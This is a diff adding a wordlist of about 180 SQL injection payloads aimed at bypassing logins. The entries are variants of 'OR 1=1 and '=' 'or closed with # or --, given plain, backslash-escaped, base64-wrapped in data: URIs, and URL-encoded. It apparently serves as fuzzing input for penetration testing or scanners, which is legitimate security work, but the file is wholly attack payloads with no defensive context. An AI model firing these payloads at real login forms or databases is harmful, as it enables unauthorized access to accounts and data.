@@ -1,0 +1,181 @@
+'=' 'or'
+'=' 'or'#
+'=' 'or'--
+'=' 'or#
+'=' 'or--
+'= or'
+'= or'#
+'= or'--
+'= or#
+'= or--
+'OR' 1'='1'
+'OR' 1'='1#
+'OR' 1'='1--
+'OR' 1'='1'#
+'OR' 1'='1'--
+'OR' 1'='22#
+'OR' 1'='1'--
+'OR' 1'='22'#
+'OR' 1'='22
+'OR' 1'='22'
+'OR 1=1'
+'OR 1=1#
+'OR 1=1--
+'OR 1=1'#
+'OR 1=1'--
+'OR 1=22#
+'OR 1=1'--
+'OR 1=22'#
+'OR 1=22
+'OR 1=22'
+\\\\'=\\\\' \\\\'or\\\\'
+\\\\'=\\\\' \\\\'or\\\\'#
+\\\\'=\\\\' \\\\'or\\\\'--
+\\\\'=\\\\' \\\\'or#
+\\\\'=\\\\' \\\\'or--
+\\\\'= or\\\\'
+\\\\'= or\\\\'#
+\\\\'= or\\\\'--
+\\\\'= or#
+\\\\'= or--
+\\\\'OR\\\\' 1\\\\'=\\\\'1\\\\'
+\\\\'OR\\\\' 1\\\\'=\\\\'1#
+\\\\'OR\\\\' 1\\\\'=\\\\'1--
+\\\\'OR\\\\' 1\\\\'=\\\\'1\\\\'#
+\\\\'OR\\\\' 1\\\\'=\\\\'1\\\\'--
+\\\\'OR\\\\' 1\\\\'=\\\\'22#
+\\\\'OR\\\\' 1\\\\'=\\\\'1\\\\'--
+\\\\'OR\\\\' 1\\\\'=\\\\'22\\\\'#
+\\\\'OR\\\\' 1\\\\'=\\\\'22
+\\\\'OR\\\\' 1\\\\'=\\\\'22\\\\'
+\\\\'OR 1=1\\\\'
+\\\\'OR 1=1#
+\\\\'OR 1=1--
+\\\\'OR 1=1\\\\'#
+\\\\'OR 1=1\\\\'--
+\\\\'OR 1=22#
+\\\\'OR 1=1\\\\'--
+\\\\'OR 1=22\\\\'#
+\\\\'OR 1=22
+\\\\'OR 1=22\\\\'
+data%3Atext/html%3Bbase64%2CJz0nICdvcic=
+data%3Atext/html%3Bbase64%2CJz0nICdvcicj
+data%3Atext/html%3Bbase64%2CJz0nICdvcictLQ==
+data%3Atext/html%3Bbase64%2CJz0nICdvciM=
+data%3Atext/html%3Bbase64%2CJz0nICdvci0t
+data%3Atext/html%3Bbase64%2CJz0gb3In
+data%3Atext/html%3Bbase64%2CJz0gb3InIw==
+data%3Atext/html%3Bbase64%2CJz0gb3InLS0=
+data%3Atext/html%3Bbase64%2CJz0gb3Ij
+data%3Atext/html%3Bbase64%2CJz0gb3ItLQ==
+data%3Atext/html%3Bbase64%2CJ09SJyAxJz0nMSc=
+data%3Atext/html%3Bbase64%2CJ09SJyAxJz0nMSM=
+data%3Atext/html%3Bbase64%2CJ09SJyAxJz0nMS0t
+data%3Atext/html%3Bbase64%2CJ09SJyAxJz0nMScj
+data%3Atext/html%3Bbase64%2CJ09SJyAxJz0nMSctLQ==
+data%3Atext/html%3Bbase64%2CJ09SJyAxJz0nMjIj
+data%3Atext/html%3Bbase64%2CJ09SJyAxJz0nMSctLQ==
+data%3Atext/html%3Bbase64%2CJ09SJyAxJz0nMjInIw==
+data%3Atext/html%3Bbase64%2CJ09SJyAxJz0nMjI=
+data%3Atext/html%3Bbase64%2CJ09SJyAxJz0nMjIn
+data%3Atext/html%3Bbase64%2CJ09SIDE9MSc=
+data%3Atext/html%3Bbase64%2CJ09SIDE9MSM=
+data%3Atext/html%3Bbase64%2CJ09SIDE9MS0t
+data%3Atext/html%3Bbase64%2CJ09SIDE9MScj
+data%3Atext/html%3Bbase64%2CJ09SIDE9MSctLQ==
+data%3Atext/html%3Bbase64%2CJ09SIDE9MjIj
+data%3Atext/html%3Bbase64%2CJ09SIDE9MSctLQ==
+data%3Atext/html%3Bbase64%2CJ09SIDE9MjInIw==
+data%3Atext/html%3Bbase64%2CJ09SIDE9MjI=
+data%3Atext/html%3Bbase64%2CJ09SIDE9MjIn
+data%3Atext/html%3Bbase64%2CXFxcXCc9XFxcXCcgXFxcXCdvclxcXFwn
+data%3Atext/html%3Bbase64%2CXFxcXCc9XFxcXCcgXFxcXCdvclxcXFwnIw==
+data%3Atext/html%3Bbase64%2CXFxcXCc9XFxcXCcgXFxcXCdvclxcXFwnLS0=
+data%3Atext/html%3Bbase64%2CXFxcXCc9XFxcXCcgXFxcXCdvciM=
+data%3Atext/html%3Bbase64%2CXFxcXCc9XFxcXCcgXFxcXCdvci0t
+data%3Atext/html%3Bbase64%2CXFxcXCc9IG9yXFxcXCc=
+data%3Atext/html%3Bbase64%2CXFxcXCc9IG9yXFxcXCcj
+data%3Atext/html%3Bbase64%2CXFxcXCc9IG9yXFxcXCctLQ==
+data%3Atext/html%3Bbase64%2CXFxcXCc9IG9yIw==
+data%3Atext/html%3Bbase64%2CXFxcXCc9IG9yLS0=
+data%3Atext/html%3Bbase64%2CXFxcXCdPUlxcXFwnIDFcXFxcJz1cXFxcJzFcXFxcJw==
+data%3Atext/html%3Bbase64%2CXFxcXCdPUlxcXFwnIDFcXFxcJz1cXFxcJzEj
+data%3Atext/html%3Bbase64%2CXFxcXCdPUlxcXFwnIDFcXFxcJz1cXFxcJzEtLQ==
+data%3Atext/html%3Bbase64%2CXFxcXCdPUlxcXFwnIDFcXFxcJz1cXFxcJzFcXFxcJyM=
+data%3Atext/html%3Bbase64%2CXFxcXCdPUlxcXFwnIDFcXFxcJz1cXFxcJzFcXFxcJy0t
+data%3Atext/html%3Bbase64%2CXFxcXCdPUlxcXFwnIDFcXFxcJz1cXFxcJzIyIw==
+data%3Atext/html%3Bbase64%2CXFxcXCdPUlxcXFwnIDFcXFxcJz1cXFxcJzFcXFxcJy0t
+data%3Atext/html%3Bbase64%2CXFxcXCdPUlxcXFwnIDFcXFxcJz1cXFxcJzIyXFxcXCcj
+data%3Atext/html%3Bbase64%2CXFxcXCdPUlxcXFwnIDFcXFxcJz1cXFxcJzIy
+data%3Atext/html%3Bbase64%2CXFxcXCdPUlxcXFwnIDFcXFxcJz1cXFxcJzIyXFxcXCc=
+data%3Atext/html%3Bbase64%2CXFxcXCdPUiAxPTFcXFxcJw==
+data%3Atext/html%3Bbase64%2CXFxcXCdPUiAxPTEj
+data%3Atext/html%3Bbase64%2CXFxcXCdPUiAxPTEtLQ==
+data%3Atext/html%3Bbase64%2CXFxcXCdPUiAxPTFcXFxcJyM=
+data%3Atext/html%3Bbase64%2CXFxcXCdPUiAxPTFcXFxcJy0t
+data%3Atext/html%3Bbase64%2CXFxcXCdPUiAxPTIyIw==
+data%3Atext/html%3Bbase64%2CXFxcXCdPUiAxPTFcXFxcJy0t
+data%3Atext/html%3Bbase64%2CXFxcXCdPUiAxPTIyXFxcXCcj
+data%3Atext/html%3Bbase64%2CXFxcXCdPUiAxPTIy
+data%3Atext/html%3Bbase64%2CXFxcXCdPUiAxPTIyXFxcXCc=
+data%3Atext/html%3Bbase64%2C
+%27%3D%27%20%27or%27
+%27%3D%27%20%27or%27%23
+%27%3D%27%20%27or%27--
+%27%3D%27%20%27or%23
+%27%3D%27%20%27or--
+%27%3D%20or%27
+%27%3D%20or%27%23
+%27%3D%20or%27--
+%27%3D%20or%23
+%27%3D%20or--
+%27OR%27%201%27%3D%271%27
+%27OR%27%201%27%3D%271%23
+%27OR%27%201%27%3D%271--
+%27OR%27%201%27%3D%271%27%23
+%27OR%27%201%27%3D%271%27--
+%27OR%27%201%27%3D%2722%23
+%27OR%27%201%27%3D%271%27--
+%27OR%27%201%27%3D%2722%27%23
+%27OR%27%201%27%3D%2722
+%27OR%27%201%27%3D%2722%27
+%27OR%201%3D1%27
+%27OR%201%3D1%23
+%27OR%201%3D1--
+%27OR%201%3D1%27%23
+%27OR%201%3D1%27--
+%27OR%201%3D22%23
+%27OR%201%3D1%27--
+%27OR%201%3D22%27%23
+%27OR%201%3D22
+%27OR%201%3D22%27
+%5C%5C%5C%5C%27%3D%5C%5C%5C%5C%27%20%5C%5C%5C%5C%27or%5C%5C%5C%5C%27
+%5C%5C%5C%5C%27%3D%5C%5C%5C%5C%27%20%5C%5C%5C%5C%27or%5C%5C%5C%5C%27%23
+%5C%5C%5C%5C%27%3D%5C%5C%5C%5C%27%20%5C%5C%5C%5C%27or%5C%5C%5C%5C%27--
+%5C%5C%5C%5C%27%3D%5C%5C%5C%5C%27%20%5C%5C%5C%5C%27or%23
+%5C%5C%5C%5C%27%3D%5C%5C%5C%5C%27%20%5C%5C%5C%5C%27or--
+%5C%5C%5C%5C%27%3D%20or%5C%5C%5C%5C%27
+%5C%5C%5C%5C%27%3D%20or%5C%5C%5C%5C%27%23
+%5C%5C%5C%5C%27%3D%20or%5C%5C%5C%5C%27--
+%5C%5C%5C%5C%27%3D%20or%23
+%5C%5C%5C%5C%27%3D%20or--
+%5C%5C%5C%5C%27OR%5C%5C%5C%5C%27%201%5C%5C%5C%5C%27%3D%5C%5C%5C%5C%271%5C%5C%5C%5C%27
+%5C%5C%5C%5C%27OR%5C%5C%5C%5C%27%201%5C%5C%5C%5C%27%3D%5C%5C%5C%5C%271%23
+%5C%5C%5C%5C%27OR%5C%5C%5C%5C%27%201%5C%5C%5C%5C%27%3D%5C%5C%5C%5C%271--
+%5C%5C%5C%5C%27OR%5C%5C%5C%5C%27%201%5C%5C%5C%5C%27%3D%5C%5C%5C%5C%271%5C%5C%5C%5C%27%23
+%5C%5C%5C%5C%27OR%5C%5C%5C%5C%27%201%5C%5C%5C%5C%27%3D%5C%5C%5C%5C%271%5C%5C%5C%5C%27--
+%5C%5C%5C%5C%27OR%5C%5C%5C%5C%27%201%5C%5C%5C%5C%27%3D%5C%5C%5C%5C%2722%23
+%5C%5C%5C%5C%27OR%5C%5C%5C%5C%27%201%5C%5C%5C%5C%27%3D%5C%5C%5C%5C%271%5C%5C%5C%5C%27--
+%5C%5C%5C%5C%27OR%5C%5C%5C%5C%27%201%5C%5C%5C%5C%27%3D%5C%5C%5C%5C%2722%5C%5C%5C%5C%27%23
+%5C%5C%5C%5C%27OR%5C%5C%5C%5C%27%201%5C%5C%5C%5C%27%3D%5C%5C%5C%5C%2722
+%5C%5C%5C%5C%27OR%5C%5C%5C%5C%27%201%5C%5C%5C%5C%27%3D%5C%5C%5C%5C%2722%5C%5C%5C%5C%27
+%5C%5C%5C%5C%27OR%201%3D1%5C%5C%5C%5C%27
+%5C%5C%5C%5C%27OR%201%3D1%23
+%5C%5C%5C%5C%27OR%201%3D1--
+%5C%5C%5C%5C%27OR%201%3D1%5C%5C%5C%5C%27%23
+%5C%5C%5C%5C%27OR%201%3D1%5C%5C%5C%5C%27--
+%5C%5C%5C%5C%27OR%201%3D22%23
+%5C%5C%5C%5C%27OR%201%3D1%5C%5C%5C%5C%27--
+%5C%5C%5C%5C%27OR%201%3D22%5C%5C%5C%5C%27%23
+%5C%5C%5C%5C%27OR%201%3D22
+%5C%5C%5C%5C%27OR%201%3D22%5C%5C%5C%5C%27
